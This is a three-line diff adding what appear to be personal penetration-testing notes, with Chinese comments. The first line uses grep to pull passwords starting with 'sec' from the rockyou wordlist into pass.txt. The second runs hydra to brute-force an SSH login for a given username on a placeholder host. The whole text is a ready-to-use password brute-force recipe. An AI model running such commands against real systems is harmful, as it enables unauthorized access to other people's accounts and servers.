@@ -1,0 +1,3 @@
+grep -Pao '^sec.*$' /usr/share/wordlists/rockyou.txt > pass.txt    提取字典某字符开头的字符
+
+hydra -l username -P pass.txt -t 4 xxxx ssh    爆破
